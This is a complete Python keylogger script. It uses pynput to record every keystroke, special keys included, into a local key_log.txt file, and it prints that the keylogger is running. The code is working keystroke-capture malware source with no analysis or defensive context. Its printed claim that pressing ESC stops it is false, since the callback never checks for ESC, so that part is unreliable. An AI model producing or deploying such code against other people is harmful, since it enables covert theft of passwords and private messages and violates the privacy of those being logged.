from pynput import keyboard

log_file = "key_log.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")

# Start listening
with keyboard.Listener(on_press=on_press) as listener:
    print("🔴 Keylogger running... Press ESC to stop.")
    listener.join()
